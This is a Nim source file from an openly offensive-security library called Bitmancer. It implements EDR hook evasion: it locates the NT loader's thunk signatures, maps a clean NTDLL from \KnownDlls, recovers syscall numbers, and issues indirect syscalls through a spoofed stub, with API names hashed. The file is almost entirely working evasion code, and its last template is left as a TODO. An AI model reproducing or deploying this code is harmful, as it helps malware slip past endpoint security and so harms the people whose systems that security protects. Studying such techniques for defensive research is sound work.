##---------------------------------------------------------------------
##      Bitmancer - a library for Offensive Security Development 
##           
##          Copyright (C) 2022  B. Marshall (zimawhite1@gmail.com)
##
##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.
##
##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.
##
##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <https://www.gnu.org/licenses/>.
## 
##----------------------------------------------------------------------------------
import
    ../core/obfuscation/hash,
    base

export
    base

## LdrThunks
##  Utilize the NT Loader's LdrThunkSignatures to map a clean NTDLL into the
##  process to find clean syscall SSNs.
##  
##  This can be greatly improved, ideally I would like to call this only once
##  and pass in a batch of needed SSNs.
##------------------------------------------------------------------------
const
    LDR_THUNK_SIGS*         = 5
    LDR_THUNK_SIG_SIZE*     = 16
    LDR_THUNK_SIG*          = uint32 0xb8d18b4c
    NtOpenSectionIndex      = 3
    NtMapViewOfSectionIndex = 4
    NtOpenSectionHash           = HASH_A cstring "NtOpenSection"
    NtMapViewOfSectionHash      = HASH_A cstring "NtMapViewOfSection"
    NtCloseHash                 = HASH_A cstring "NtClose"
    NtUnmapViewOfSectionHash    = HASH_A cstring "NtUnmapViewOfSection"
type
    LdrThunkSignature*      = array[LDR_THUNK_SIG_SIZE, byte]
    LdrpThunkSignatures*    = array[LDR_THUNK_SIGS, LdrThunkSignature]
    PLdrpThunkSignatures*   = ptr LdrpThunkSignatures

## Private
##------------------------------------------------------------------------
template isThunkSignatureArray(pCurrentAddr: PVOID): bool =
    cast[ptr uint32](pCurrentAddr)[] == LDR_THUNK_SIG and
    cast[ptr uint32](pCurrentAddr +! LDR_THUNK_SIG_SIZE)[] == LDR_THUNK_SIG and
    cast[ptr uint32](pCurrentAddr +! LDR_THUNK_SIG_SIZE * 2)[] == LDR_THUNK_SIG and
    cast[ptr uint32](pCurrentAddr +! LDR_THUNK_SIG_SIZE * 3)[] == LDR_THUNK_SIG and 
    cast[ptr uint32](pCurrentAddr +! LDR_THUNK_SIG_SIZE * 4)[] == LDR_THUNK_SIG

template NT_OPEN_SECTION_SIG(ldrsigs: PLdrpThunkSignatures): WORD =
    cast[PWORD](addr ldrsigs[NtOpenSectionIndex][4])[]

template NT_MAP_VIEW_OF_SECTION_SIG(ldrsigs: PLdrpThunkSignatures): WORD =
    cast[PWORD](addr ldrsigs[NtMapViewOfSectionIndex][4])[]

## Helpers
##------------------------------------
proc ldrThunkFindCleanStub(stub: var PVOID) =
    for i in 0 ..< 500:    
        ## check neighboring syscall down
        if checkStub(stub, DWORD(i * StubOffsetDown)).isOk():
            stub +=! DWORD(i * StubOffsetDown)
            break
        ## check neighboring syscall up
        if checkStub(stub, DWORD(i * StubOffsetUp)).isOk():
            stub -=! DWORD(i * StubOffsetUp)
            break

proc ldrThunkFindSyscall(ident: SomeProcIdent): NtResult[PVOID] =
    let Ntdll               = ? NTDLL_BASE()
    var inMemNtUnmapView    = ? getProcAddress(Ntdll, ident)
    if inMemNtUnmapView.isHooked():
        ldrThunkFindCleanStub inMemNtUnmapView
    ok (inMemNtUnmapView)

proc ldrThunkGetSyscallResult(pCleanNtdll: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    ## Retrieves the Nt* API `T`'s SSN from the Clean NTDLL. Then finds a syscall address and 
    ## instruction from the in memory NTDLL to use for the indirect syscall.
    let 
        cleanNtUnmapView    = ? getProcAddress(pCleanNtdll, ident)
        cleanSyscallResult  = ? checkStub(cleanNtUnmapView, 0)
        pInMemFunc          = ? ldrThunkFindSyscall(ident)
    ok Syscall(
        wSyscall: cleanSyscallResult.wSyscall,
        pSyscall: pInMemFunc
    )

proc ldrThunkGetNtSyscall(pCleanNtdll: ModuleHandle, T: typedesc, ident: SomeProcIdent): NtResult[NtSyscall[T]] {.inline.} =
    let syscallRes = ? ldrThunkGetSyscallResult(pCleanNtdll, ident)
    ok NtSyscall[T](
        syscall:    syscallRes,
        pFunction:  cast[T](spoofStub)
    )

proc ldrThunkCleanUp(sHandle: HANDLE, pCleanNtdll: ModuleHandle): NtResult[void] {.discardable.} =
    genSyscall(NtUnmapViewOfSection)
    genSyscall(NtClose)
    let 
        NtSyscallClose      = ? ldrThunkGetNtSyscall(pCleanNtdll, NtClose, NtCloseHash)
        NtSyscallUnmapView  = ldrThunkGetNtSyscall(pCleanNtdll, NtUnmapViewOfSection, NtUnmapViewOfSectionHash)
        .valueOr():
            discard NtCloseWrapper(sHandle, NtSyscallClose)
            return err SyscallNotFound
        
    if not NT_SUCCESS NtUnmapViewOfSectionWrapper(
        rtlCurrentProcess(),
        pCleanNtdll.PVOID,
        NtSyscallUnmapView
    ): return err SyscallFailure

    NT_RESULT NtCloseWrapper(
        sHandle,
        NtSyscallClose
    ): void

## Map Clean NTDLL
##------------------------------------
func getLdrThunks(imageBase: ModuleHandle): NtResult[PLdrpThunkSignatures] =
    let pSection        = ? getDataSection(imageBase)
    var pCurrentAddr    = SECTION_START(imageBase, pSection)
    
    while pCurrentAddr != SECTION_END(imageBase, pSection) -! (LDR_THUNK_SIG_SIZE * LDR_THUNK_SIGS):
        if isThunkSignatureArray(pCurrentAddr):
            return ok cast[PLdrpThunkSignatures](pCurrentAddr)
        pCurrentAddr = pCurrentAddr +! 4
    err SignaturesNotFound

proc ldrThunkOpenSection(sHandle: var HANDLE, ssn: WORD): NtResult[void] =
    genSyscall(NtOpenSection)
    var knownDlls {.stackStringW.}  = "\\KnownDlls\\ntdll.dll"
    
    ## Initialize Object Attributes
    var
        objAttributes   = OBJECT_ATTRIBUTES()
        objPath         = UNICODE_STRING()
        objBuffer       = cast[PCWSTR](addr knownDlls[0])
    RTL_INIT_EMPTY_UNICODE_STRING(objPath, objBuffer, objBuffer.len.USHORT)
    InitializeObjectAttributes(addr objAttributes, addr objPath, 0, sHandle, NULL)
  
    ## Get a syscall instruction for indirect jump
    let pInMemFunc = ? ldrThunkFindSyscall(NtOpenSectionHash)

    ## Do Syscall
    let NtOpenSect = NtSyscall[NtOpenSection](
        syscall:    Syscall(
            wSyscall: ssn,
            pSyscall: pInMemFunc
        ),
        pFunction:  cast[NtOpenSection](spoofStub)
    )
    ## TODO: need SECTION_QUERY?
    NT_RESULT NtOpenSectionWrapper(
        sHandle, 
        ACCESS_MASK(SECTION_MAP_READ or SECTION_MAP_EXECUTE),
        addr objAttributes,
        NtOpenSect
    ): void

proc ldrThunkMapView(sHandle: HANDLE, pCleanNtdll: var ModuleHandle, ssn: WORD): NtResult[void] =
    genSyscall(NtMapViewOfSection)
    var viewSize = SIZE_T(0)

    ## Get a syscall instruction for indirect jump
    let pInMemFunc = ? ldrThunkFindSyscall(NtMapViewOfSectionHash)

    let NtMapView = NtSyscall[NtMapViewOfSection](
        syscall:    Syscall(
            wSyscall: ssn,
            pSyscall: pInMemFunc,
        ),
        pFunction: cast[NtMapViewOfSection](spoofStub)
    )

    NT_RESULT NtMapViewOfSectionWrapper(
        sHandle, rtlCurrentProcess(), pCleanNtdll.PVOID, 
        0, 0, NULL, viewSize, 1, 0, PAGE_READONLY, 
        NtMapView
    ): void

proc ldrThunkMapCleanNtdll(imageBase: ModuleHandle, sHandle: var HANDLE, pCleanNtdll: var ModuleHandle): NtResult[void] =
    let 
        pLdrThunkSignatures     = ? getLdrThunks(imageBase)
        wNtOpenSection          = NT_OPEN_SECTION_SIG(pLdrThunkSignatures)
        wNtMapViewOfSection     = NT_MAP_VIEW_OF_SECTION_SIG(pLdrThunkSignatures)
    if wNtOpenSection == 0 or wNtMapViewOfSection == 0:
        return err SyscallNotFound
    
    ? ldrThunkOpenSection(sHandle, wNtOpenSection)
    ldrThunkMapView(sHandle, pCleanNtdll, wNtMapViewOfSection)

## Public
##------------------------------------
proc ldrThunksEat*(imageBase: ModuleHandle, ident: SomeProcIdent): SyscallResult =
    var 
        sectionHandle   = HANDLE(0)
        pCleanNtdll     = ModuleHandle(NULL)
    ? ldrThunkMapCleanNtdll(imageBase, sectionHandle, pCleanNtdll)
    result = ldrThunkGetSyscallResult(pCleanNtdll, ident)
    ldrThunkCleanUp(sectionHandle, pCleanNtdll)

template ldrThunks*(imageBase, importBase: ModuleHandle, ident: SomeProcIdent, symEnum: static SymbolEnumeration): SyscallResult =
    ## TODO
